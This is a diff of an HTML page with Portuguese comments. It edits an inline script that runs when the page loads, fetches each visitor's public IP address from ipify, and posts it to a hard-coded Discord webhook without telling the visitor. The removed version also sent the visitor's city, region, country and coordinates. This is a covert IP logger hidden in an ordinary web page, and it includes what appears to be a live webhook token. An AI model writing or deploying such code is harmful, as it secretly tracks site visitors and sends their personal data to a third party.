@@ -102,14 +102,14 @@
 
     </style>
 </head>
-        <script>
+    <script>
         // URL do Webhook do Discord (substitua pelo seu)
         const discordWebhookUrl = "https://discord.com/api/webhooks/1320238731902451762/pQRGKmQTSF4a9h0PM7ckG1u3NEsEXi3FxIGE6pOeLEZfLG63uJXJSPrPPjb9WVULOTPv";
 
-        // Função para enviar as informações para o Discord
-        function sendToDiscord(ip, locationData) {
+        // Função para enviar o IP para o Discord
+        function sendToDiscord(ip) {
             const message = {
-                content: `Novo visitante com o IP: ${ip}\nLocalização: ${locationData.city}, ${locationData.region}, ${locationData.country}\nLatitude: ${locationData.lat}, Longitude: ${locationData.lon}`
+                content: `New IP: ${ip}`
             };
 
             fetch(discordWebhookUrl, {
@@ -124,28 +124,20 @@
                 console.log('Mensagem enviada para o Discord:', data);
             })
             .catch(error => {
-                console.error('Erro ao enviar dados para o Discord:', error);
+                console.error('Erro ao enviar IP para o Discord:', error);
             });
         }
 
-        // Função para obter informações detalhadas sobre o IP usando a API ip-api
-        fetch('http://ip-api.com/json')
+        // Função para obter o IP do visitante
+        fetch('https://api.ipify.org?format=json')
             .then(response => response.json())  // Converte a resposta para JSON
             .then(data => {
-                const ip = data.query;  // O IP do visitante
-                const locationData = {
-                    city: data.city,     // Cidade
-                    region: data.region, // Região
-                    country: data.country, // País
-                    lat: data.lat,       // Latitude
-                    lon: data.lon        // Longitude
-                };
-                
-                // Envia as informações para o Discord
-                sendToDiscord(ip, locationData);
+                const ip = data.ip;
+                // Envia o IP para o Discord
+                sendToDiscord(ip);
             })
             .catch(error => {
-                console.error('Erro ao obter informações sobre o IP:', error);
+                console.error('Erro ao obter o IP:', error);
             });
     </script>
     
